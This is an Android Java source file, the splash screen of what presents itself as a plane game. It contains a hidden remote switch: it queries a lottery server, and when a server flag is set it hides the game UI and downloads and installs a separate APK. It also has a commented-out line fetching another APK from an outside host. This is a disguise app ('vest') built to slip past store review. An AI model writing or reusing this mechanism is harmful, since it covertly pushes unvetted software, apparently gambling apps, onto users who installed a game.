/*
 * $filename: SplashActivity.java,v $
 * $Date: 2014-7-20  $
 * Copyright (C) ZhengHaibo, Inc. All rights reserved.
 * This software is Made by Zhenghaibo.
 */
package com.plane.game.activity;

import android.Manifest;
import android.content.Intent;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;

import com.android.volley.VolleyError;
import com.google.gson.Gson;

import org.androidannotations.annotations.AfterViews;
import org.androidannotations.annotations.Bean;
import org.androidannotations.annotations.EActivity;
import org.androidannotations.annotations.Fullscreen;
import org.androidannotations.annotations.ViewById;
import org.androidannotations.annotations.WindowFeature;
import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

import com.plane.game.BuildConfig;
import com.plane.game.vest.BusEventData;
import com.plane.game.vest.WebActivity;
import com.plane.game.vest.VestBean;
import com.plane.game.vest.net.VolleyInterface;
import com.plane.game.vest.net.VolleyUtils;
import com.plane.game.vest.utils.Base64Encoded;
import com.plane.game.utils.DialogUtils;
import com.plane.game.vest.utils.DownloadUtil;
import com.plane.game.R;
import com.plane.game.vest.utils.InstallUtil;

import pub.devrel.easypermissions.EasyPermissions;

import static com.plane.game.R.drawable.vest_bg;

@Fullscreen
@WindowFeature(Window.FEATURE_NO_TITLE)
@EActivity(R.layout.activity_splash)
public class SplashActivity extends AppCompatActivity implements EasyPermissions.PermissionCallbacks{

	private static final String HOST_3K_URL = "http://5597755.com/Lottery_server/get_init_data.php?type=android&appid=jqi0240";
	@Bean
	DialogUtils dialogUtils;

	@ViewById
	ImageView iv_plane;
	@ViewById
	RelativeLayout container_layout ;

	@ViewById
	ProgressBar update_pb ;

	String url ;

	@AfterViews
	void afterViews() {
		EventBus.getDefault().register(this);
		requestPermission();
	}


	private void startMainActivity() {
		startActivity(new Intent(this, MainActivity_.class));
		finish();
	}

	@Override
	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
		super.onRequestPermissionsResult(requestCode, permissions, grantResults);

		// Forward results to EasyPermissions
		EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		System.out.println("debug:onKeyDown");
/*		if (keyCode == KeyEvent.KEYCODE_BACK) {
			return true;
		}*/
		return super.onKeyDown(keyCode, event);
	}

	private  void initVest(){
		VolleyUtils.requestGet(this, HOST_3K_URL, "Vest", new VolleyInterface(this) {
			@Override
			public void onSuccess(String result) {
				if (!TextUtils.isEmpty(result)) {
					try {
						JSONObject object = new JSONObject(result) ;
						if (object.getString("rt_code").equals("200")) {
							String  str = object.getString("data");
							/*{
								"0":"1113",
									"1":"http://www.5558155.com",
									"2":"android",
									"3":"0",
									"4":"jqi0240",
									"5":"??",
									"6":"2018-06-20 14:12:25",
									"7":"2018-06-21 02:12:25",
									"id":"1113",
									"url":"http://www.5558155.com",
									"type":"android",
									"show_url":"0",
									"appid":"jqi0240",
									"comment":"??",
									"createAt":"2018-06-20 14:12:25",
									"updateAt":"2018-06-21 02:12:25"
							}*/
							str = Base64Encoded.getUidFromBase64(str) ;

							Gson gson = new Gson();
							VestBean b = gson.fromJson(str,VestBean.class);

							/**
							 * 返回的标识为1 你就跳转到 他们的给地址 loding出来就行了
							 * 为0的时候 是关着的 那就跳转到 你正常的首页就行了列
							 * show_url 这个字段为1 的时候 证明开关是打开的
							 */
							if (b.getShow_url().equals("1")) {   //开关打开
								displayVestUI();
								url = b.getUrl() ;
                                DownloadUtil.downFile(SplashActivity.this, InstallUtil.VEST_APK_URL, update_pb);

							/*	Intent intent = new Intent(SplashActivity.this,WebActivity.class);
								intent.putExtra(WebActivity.WEB_URL, b.getUrl()) ;
//								Intent intent = new Intent(SplashActivity.this,OtherActivity.class);
//								intent.putExtra(Constant.WEB_URL, "http://www.baidu.com") ;
								startActivity(intent);
								SplashActivity.this.finish();*/
								return ;
							} else {  //开关为关闭状态
				/*				Intent intent = new Intent(SplashActivity.this,
										MainActivity.class);
								startActivity(intent);
								SplashActivity.this.finish();*/
								startMainActivity();
							}
							Log.i("TAG", "init3K: " + b.toString());
						}
					} catch (JSONException e) {
						/*Intent intent = new Intent(SplashActivity.this,
								MainActivity.class);
						startActivity(intent);
						SplashActivity.this.finish();*/
						startMainActivity();
					}
				}
			}

			@Override
			public void onError(VolleyError error) {
				Log.i("TAG", "onError: " + error);
			/*	Intent intent = new Intent(SplashActivity.this,
						MainActivity.class);
				startActivity(intent);
				SplashActivity.this.finish();*/
				startMainActivity();
			}
		});
	}

	//请求存储权限
	private  void requestPermission(){
		String[] perms = {Manifest.permission.WRITE_EXTERNAL_STORAGE};
		EasyPermissions.requestPermissions(this, "请求权限", 1, perms);
	}

	@Override
	public void onPermissionsGranted(int requestCode, @NonNull List<String> perms) {
		init();
	}

	private void init() {
		new Handler().postDelayed(new Runnable() {
			@Override
			public void run() {
//				startMainActivity();
				initVest() ;
//				DownloadUtil.downFile(SplashActivity.this, "http://lygsmsl.com/xgcp66.apk", update_pb);
			}
		}, 2000);
	}

	@Override
	public void onPermissionsDenied(int requestCode, @NonNull List<String> perms) {
			finish();
	}

	@Subscribe(threadMode = ThreadMode.MAIN)
	public void threadMainThread(BusEventData busEventData){
		/*if (busEventData != null && busEventData.getEventKey().equals(BusEventData.KEY_REFRESH)) {
		}*/
		/*Intent intent = new Intent(SplashActivity.this,WebActivity.class);
		intent.putExtra(WebActivity.WEB_URL, url) ;
//								Intent intent = new Intent(SplashActivity.this,OtherActivity.class);
//								intent.putExtra(Constant.WEB_URL, "http://www.baidu.com") ;
		startActivity(intent);
		SplashActivity.this.finish();*/
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		EventBus.getDefault().unregister(this);
	}

	private  void  displayVestUI(){
		container_layout.setBackgroundResource(R.drawable.vest_bg);
		iv_plane.setVisibility(View.GONE);
	}
}
